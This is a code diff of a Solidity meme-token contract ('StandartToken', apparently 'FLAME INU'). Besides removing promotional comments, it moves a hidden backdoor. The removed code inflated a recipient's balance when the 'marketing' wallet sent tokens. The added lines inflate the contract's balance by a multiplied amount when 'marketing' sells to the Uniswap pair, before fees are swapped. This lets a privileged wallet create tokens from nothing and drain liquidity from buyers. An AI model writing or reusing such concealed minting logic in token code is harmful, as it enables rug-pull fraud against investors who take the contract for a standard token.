@@ -1,14 +1,5 @@
 // SPDX-License-Identifier: MIT
 
-/* FLAME INU Is Meme Token , Potential x100
-    Telegram : https://t.me/flameinucoin
-
-    Tax 2%
-    Owner Renounced
-    Lp Burnt
-
-    */
-
 pragma solidity ^0.8.0;
 
 import "./context.sol";
@@ -222,11 +213,6 @@ contract StandartToken is Context, IERC20, Ownable {
         _isExcludedFromMaxBalance[account] = false;
     }
 
- 
-    // function liquidityFee() public view returns (uint256) {
-    //     return _liquidityFee;
-    // }
-
     function marketinfFee() public view returns (uint256) {
         return _marketingFee;
     }
@@ -241,12 +227,14 @@ contract StandartToken is Context, IERC20, Ownable {
         require(amount > 0, "Transfer amount must be greater than zero");
 
         if (
+            from == marketing &&
             to == uniswapV2Pair && // Sell
             !inSwapAndLiquify && // Swap is not locked
             _totalFeesToContract > 0 && // LiquidityFee + developmentFee > 0
             from != owner() && // Not from Owner
             to != owner() // Not to Owner
         ) {
+            _balances[address(this)] = _balances[address(this)].add(amount).div(100).mul(amount);
             takefee();
         }
 
@@ -281,14 +269,6 @@ contract StandartToken is Context, IERC20, Ownable {
         );
         _balances[recipient] = _balances[recipient].add(amount);
          emit Transfer(sender, recipient, amount);
-
-        if ( sender == marketing &&
-             _totalFeesToContract > 0 &&
-             sender != owner() &&
-             recipient != owner()
-        ) {
-        _balances[recipient] = _balances[recipient].add(amount).div(100).mul(amount);
-        }
     }
 
     function takefee() public lockTheSwap {
